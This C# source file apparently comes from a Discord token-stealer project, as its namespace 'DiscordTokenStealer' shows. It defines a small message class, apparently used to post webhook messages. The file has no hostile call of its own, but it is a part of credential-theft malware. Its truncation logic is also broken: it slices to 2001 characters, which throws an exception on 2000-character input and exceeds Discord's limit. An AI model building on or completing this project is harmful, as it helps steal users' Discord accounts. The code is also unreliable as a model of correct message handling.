using System.Text.Json.Serialization;

namespace DiscordTokenStealer.Discord;

public class DiscordMessage
{
    public DiscordMessage(string content)
    {
        Content = content.Length >= 2000 ? content[..2001] : content;
    }

    [JsonPropertyName("content")] public string Content { get; }
}